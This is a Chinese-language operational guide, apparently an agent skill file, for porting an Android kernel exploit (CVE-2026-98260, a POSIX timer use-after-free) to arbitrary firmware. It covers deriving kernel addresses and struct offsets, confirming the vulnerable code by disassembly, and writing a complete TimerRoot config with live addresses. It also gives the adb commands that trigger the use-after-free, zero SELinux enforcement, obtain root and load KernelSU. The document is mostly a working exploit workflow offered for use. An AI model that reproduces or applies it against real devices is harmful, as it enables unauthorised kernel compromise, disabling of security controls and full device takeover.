# Timer 固件适配技能：任意系统固件 → CVE-2026-98260 常量 → TimerRoot conf

> 本技能总结从「任意 Android 系统固件」出发，提取内核 Image、反汇编确认漏洞、推导
> CVE-2026-98260（POSIX CPU timer UAF）全部设备常量、并生成 TimerRoot 配置文件的完整流程。
> 所有命令、脚本名与字段名均来自已实机验证的 PKT110（6.6.118）与 OPD2515（6.12.58/6.12.69）适配。

---

## 0. 目标与产物

输入：一个 Android 设备的固件（OTA 包 / boot.img / 内核 Image）。

输出：一个 TimerRoot 的 HOCON conf 文件（`<设备>.conf`），包含 18 个字段，交给
`TimerRoot/native/timer`（`timer --conf <conf> [ids|leak|shell|fake]`）即可在设备端提权并
late-load KernelSU。

判定产物是否需要：只有「目标内核未修复该漏洞」时才继续；已修复则直接放弃。

| 漏洞 | 6.6 修复版本 | 6.12 修复版本 |
|---|---|---|
| CVE-2026-98260 | 6.6.158 | 6.12 相应 backport（`acb03d388…` "exec: Cleanup POSIX timers right after de_thread()"） |

修复判定以**反汇编为准**（见第 3 节），版本号只作初筛。

---

## 1. 获取内核 Image

三种来源，最终都要得到 **raw arm64 Image**（未压缩、可直接反汇编）。

### 1.1 从 OTA payload 提取（通用）
```bash
# 1) 下载 OTA zip（厂商各自的更新渠道/官网；OPPO 可抓 CDN 直链并校验 MD5）
# 2) 解出 payload.bin 中的 boot.img：https://github.com/ssut/payload-dumper-go
# 3) 从 boot.img 解出 kernel：https://github.com/cfig/Android_boot_image_editor
unpack_bootimg.py --boot_img boot.img   # 或 magiskboot / Android Image Kitchen
# 得到 kernel（通常是 kernel.lz4）
```

### 1.2 从设备直接提取（已 root 或有 fastboot 镜像）
```bash
adb shell su -c 'dd if=/dev/block/by-name/boot_a of=/data/local/tmp/boot.img'
```

### 1.3 解压 kernel.lz4（关键：是 LZ4 *legacy* 格式，不是标准 LZ4 frame）
```bash
# 标准 lz4 工具解不了 legacy 格式；用 python-lz4 的 legacy 模式或下面的写法
python3 - <<'EOF'
import lz4.block
raw = open('kernel.lz4','rb').read()
open('Image','wb').write(lz4.block.decompress(raw, uncompressed_size=64*1024*1024))
EOF
```

### 1.4 确认内核基址（决定文件偏移 → 虚地址映射）
- `-4k` 页（`...-4k` 后缀）：`TEXT_OFFSET=0`，`_text = 0xffffffc080000000`，文件偏移 == 虚地址 − `_text`。
- `-16k` 页：`TEXT_OFFSET=0x80000`，需按实际情况校准。

用 `arm64_image_size`（读 ELF header 的 `ARM\x64` magic @0x38）校验 Image 完整性。

---

## 2. 恢复符号（kallsyms + BTF）

### 2.1 kallsyms 表恢复
内核内嵌的 kallsyms 表（压缩 token 表）可直接恢复，无需 System.map：
```bash
# 参考 GhostLock 的 Rust 提取器（kallsyms_finder.rs / btf.rs / boot.rs）：
#   https://github.com/YuKongA/ghostlock-app/tree/main/tools/extract_rs
python3 extract_symbols.py /path/to/Image
# 产物：kallsyms-full-<Image stem>.json  （name -> [addresses]，PKT110 有 106365 条）
```

### 2.2 BTF 提取（结构体大小与字段偏移的唯一权威）
```bash
python3 btf_query.py /path/to/Image
# 输出关键结构体：
#   struct k_itimer        size=0x108 (6.6) / 0x100 (6.12)
#   struct cred            size=0xb8；uid@0x8, security@0x80, user@0x88, user_ns@0x90, ucounts@0x98, group_info@0xa0
#   struct task_struct     size=0x12c0 (6.6) / 0x1440 (6.12)；cred@0x820 (6.6) / 0x900 (6.12)
#   struct task_security_struct  sid@0x4, exec_sid@0x8, create_sid@0xc
```
BTF 提取用 `find_embedded_btf`（搜 `0xEB9F` magic），失败时回退到 `.BTF` section。

---

## 3. 反汇编验证漏洞（必做，版本号不作数）

### 3.1 把 raw Image 包成 ELF 再反汇编
```bash
NDK=$ANDROID_NDK_HOME/toolchains/llvm/prebuilt/<host>/bin   # host: darwin-x86_64 / linux-x86_64 / windows-x86_64
"$NDK/llvm-objcopy" -I binary -O elf64-littleaarch64 \
    --rename-section .data=.text,alloc,load,readonly,code Image Image.elf
"$NDK/llvm-objdump" -D --triple=aarch64-none-elf Image.elf > Image.dis
```

### 3.2 定位 `begin_new_exec` 并核对调用顺序
用 kallsyms 找到 `begin_new_exec`、`exec_mmap`、`posix_cpu_timers_exit`、`exit_itimers` 的地址，
在 `Image.dis` 中反汇编 `begin_new_exec`（函数内每个 `bl` 目标都要**精确命中** kallsyms 函数起始地址，
用来确认偏移无错位）。

**判定规则**：调用链实序为
```
unshare_files → set_mm_exe_file → exec_mmap → exec_task_namespaces
             → posix_cpu_timers_exit → exit_itimers
```
- `posix_cpu_timers_exit` 在 `exec_mmap` **之后** → **VULNERABLE（可利用）**。
- 在 `de_thread`/`zap_other_threads` 之后、`exec_mmap` **之前** → 已修复，放弃。

PKT110 6.6.118 实测（`begin_new_exec`@`0xffffffc0803e3eb0`）：
```
3e428c  bl  exec_mmap                  ; <-- exec_mmap
3e42bc  bl  exec_task_namespaces
3e42d4  bl  posix_cpu_timers_exit      ; <-- 在 exec_mmap 之后 → vulnerable
3e42e4  bl  exit_itimers
```

---

## 4. 推导常量（核心）

每个字段的推导方法如下（值参考 PKT110 6.6.118，与 6.12 的差异见第 8 节）。

### 4.1 `timer_site`（最关键，UAF 写原语的目标）
`do_timer_create()` 里 `kmem_cache_alloc(posix_timers_cache, …)` 的 **bl 调用点 + 4**。
```bash
# 反汇编 do_timer_create，找 bl <kmem_cache_alloc>，记 bl 指令地址 a，则 timer_site = a + 4
# 6.6 用 kmem_cache_alloc；6.12 用 kmem_cache_alloc_noprof（符号名不同！）
# PKT110: do_timer_create@0xffffffc0801a4d54, bl kmem_cache_alloc@0x1a4df8 → timer_site=0xffffffc0801a4dfc
```
可用 [capstone](https://github.com/capstone-engine/capstone) 反汇编自动定位 `do_timer_create`/
`copy_process` 里的 alloc 调用点。

### 4.2 结构体大小与偏移（BTF，唯一权威）
| 字段 | 来源 | 6.6.118 | 6.12 |
|---|---|---|---|
| `timer_alloc` | `sizeof(k_itimer)`（slab 无 HWCACHE_ALIGN，对象大小==sizeof） | 0x108 | 0x100 |
| `cred_req` | `sizeof(cred)` | 0xb8 | 0xb8 |
| `cred_alloc` | `ALIGN(sizeof(cred), 0x40)`（cred_jar SLAB_HWCACHE_ALIGN） | 0xc0 | 0xc0 |
| `cred_uid_off` | `cred.uid` | 0x8 | 0x8 |
| `task_cred_off` | `task_struct.cred` | 0x820 | 0x900 |
| `task_alloc_bytes` | `sizeof(task_struct)` | 0x12c0 | 0x1440 |
| `selinux_blob_off` | `task_security_struct.exec_sid` | 0x8 | 0x8 |

### 4.3 链接时符号地址（kallsyms）
| 字段 | kallsyms 符号 |
|---|---|
| `selinux_state` | `selinux_state`（内核态静态变量，写零 → permissive） |
| `panic_on_warn` | `panic_on_warn`（写零避免 WARN 触发 panic） |
| `root_user` | `root_user`（root kuid，用于 fake cred） |
| `init_user_ns` | `init_user_ns` |
| `init_ucounts` | `init_ucounts` |
| `init_groups` | `init_groups` |

### 4.4 `copy_process_low21`（task_struct 分配 call site 的低 21 位）
`copy_process()` 里 `kmem_cache_alloc_node(task_struct_cachep, …)` 的 **bl 调用点 + 4，取低 21 位**（`& 0x1fffff`）。
```bash
# PKT110: copy_process@0xffffffc0800ab804, bl kmem_cache_alloc_node@0xab940 → call_site=0xab944 → low21=0xab944
```

### 4.5 常量字面量
| 字段 | 值 | 说明 |
|---|---|---|
| `fullcap` | `0x1ffffffffff` | CAP_FULL_SET（62 位全 1） |
| `selinux_sid_kernel` | `1` | `SECINITSID_KERNEL` |
| `ksu_kmi` | `android15-6.6` / `android16-6.12` | 由内核大版本决定，见下表 |

### 4.6 `ksu_kmi`（KernelSU 模块 KMI）
| 内核 | ksu_kmi |
|---|---|
| 6.6 android15 | `android15-6.6` |
| 6.12 android16 | `android16-6.12` |
| 6.18 android17 | `android17-6.18` |

libksud.so 内嵌这些模块，`ksu_stage.sh` 用 `--kmi` 选择；错误会导致 `late-load rc=0` 但 `KSU_MISSING`。

---

## 5. 生成 TimerRoot conf 文件

HOCON 键值格式（`key = value`，支持 `#`/`//` 注释，JSON 子集合法）。字段与
`TimerRoot/native/timer.c` 的 `struct timer_cfg` 一一对应，`release` 用于 `uname -r` 精确匹配。

```hocon
# <设备>-<内核版本>.conf
release = "6.6.118-android15-8-g9bc34d5b0c79-abogki537459655-4k"
schema_version = 1

timer_site = 0xffffffc0801a4dfc
timer_alloc = 0x108
cred_req = 0xb8
cred_alloc = 0xc0
cred_uid_off = 0x8
selinux_state = 0xffffffc08239c620
panic_on_warn = 0xffffffc08214b2cc
task_cred_off = 0x820
copy_process_low21 = 0xab944
task_alloc_bytes = 0x12c0
fullcap = 0x1ffffffffff
root_user = 0xffffffc08216f6e0
init_user_ns = 0xffffffc08216f450
init_ucounts = 0xffffffc0821711b0
init_groups = 0xffffffc082170c40
selinux_blob_off = 0x8
selinux_sid_kernel = 1
ksu_kmi = "android15-6.6"
```

三处放置（保持一致）：
1. `TimerRoot/conf/<设备>.conf`（源码库）。
2. `TimerRoot/app/src/main/assets/conf/<设备>.conf`（打进 APK，`install` 时解到 `/data/local/tmp/timer-conf/`）。
3. 设备端 `/data/local/tmp/timer-conf/<设备>.conf`（UserService `confArg()` 按 `release` 匹配 `uname -r`）。

---

## 6. 实机验证

每步执行前**三件事**：唤醒屏幕 + 增 trace buffer + 确认无残留进程。

```bash
SER=<serial>
adb -s "$SER" shell input keyevent KEYCODE_WAKEUP
adb -s "$SER" shell 'echo 8192 > /sys/kernel/tracing/buffer_size_kb'
adb -s "$SER" shell 'ps -A | grep -i timer'   # 只应看到 [tcpc_timer_type_c_port0]
```

### 6.1 `leak`（安全，不触发 UAF，验证常量正确）
```bash
adb -s "$SER" shell /data/local/tmp/timer --conf /data/local/tmp/timer.conf leak
```
判据：`recs=1`（cred 泄漏）+ `task_recs=1`（task 泄漏，证明 `copy_process_low21` 正确）。

### 6.2 `fake`（触发 UAF，提权 + late-load KernelSU）
```bash
adb -s "$SER" shell "cd /data/local/tmp && nohup setsid ./timer --conf ./timer.conf fake >timer.log 2>&1 </dev/null &"
# 独立命令轮询（macOS 上启动命令会挂起，但进程已启动）
adb -s "$SER" shell 'tail -f /data/local/tmp/timer.log'
```
成功判据：三个 plant（`fake_cred` / `selinux` / `fake_uid`）连续 `free_seen=1 burst hit=1`，
随后 `child report uid=0 euid=0` → `KSU_LOADED`。
最终验证：
```bash
adb -s "$SER" shell '/system/bin/su -c id'      # uid=0(root) context=u:r:ksu:s0
adb -s "$SER" shell 'grep -i kernelsu /proc/modules'
```

---

## 7. 陷阱（务必遵守）

1. **绝不 `kill` park 进程**：miss/成功后进程 `park_forever` 持有 zombie/cred 页，`kill` 会让 init
   回收 stale timer 节点 → 内核 panic。唯一安全清理是整机重启。
2. **绝不 `timeout` 包裹 fake**：`timeout` 到期 SIGKILL park 进程，等同第 1 条。
3. **必须增 trace buffer**：重启后 `buffer_size_kb` 回到 ~7KB，4MB mmap 的 page 事件会溢出，
   `ids` 配对失败（pairs=0）。
4. **保持屏幕唤醒**：锁屏/doze 干扰竞争窗口时序。
5. **一次只一个 fake**：多次叠加互相抢占 slab。重试前必须重启。
6. **`adb shell "... &"` 在 macOS 挂起**：后台进程持有管道 fd，但进程已启动；用 `nohup setsid`
   + 完整 fd 重定向，立即返回，用独立命令轮询日志。
7. **竞争是概率性的**：miss 判据 `zombie code=1 status=42`（victim exec 成功、timer 节点未 stale）；
   命中判据 `burst hit=1`。miss 需重启后重试。

---

## 8. 6.6 vs 6.12 差异速查（跨版本适配时最容易踩的坑）

| 项 | 6.6 (PKT110) | 6.12 (OPD2515) |
|---|---|---|
| alloc 符号 | `kmem_cache_alloc` / `kmem_cache_alloc_node`（无 `_noprof`） | `kmem_cache_alloc_noprof` 等 |
| `timer_alloc` | 0x108 | 0x100 |
| `task_cred_off` | 0x820 | 0x900 |
| `task_alloc_bytes` | 0x12c0 | 0x1440 |
| `cred` 布局 | **一致**（uid@0x8, security@0x80…） | 一致 |
| `task_security_struct` | **一致**（exec_sid@0x8） | 一致 |
| `ksu_kmi` | android15-6.6 | android16-6.12 |

---

## 9. 在线参考

| 项 | 链接 |
|---|---|
| exploit 源码（上游，含多设备移植） | https://github.com/YuKongA/CVE-2026-98260 |
| exploit 源码（本机 fork，3 设备分支） | https://github.com/rikumi/CVE-2026-98260 |
| TimerRoot app + conf（`native/timer.c` conf 驱动） | https://github.com/rikumi/TimerRoot |
| GhostLock 上游（Rust 提取器 `tools/extract_rs/`：kallsyms_finder.rs / btf.rs / boot.rs） | https://github.com/YuKongA/ghostlock-app |
| payload-dumper-go（payload.bin → boot.img） | https://github.com/ssut/payload-dumper-go |
| Android boot image 编辑器（boot.img 解包/打包） | https://github.com/cfig/Android_boot_image_editor |
| capstone（反汇编定位 call site） | https://github.com/capstone-engine/capstone |
| KernelSU（late-load 目标） | https://github.com/tiann/KernelSU |
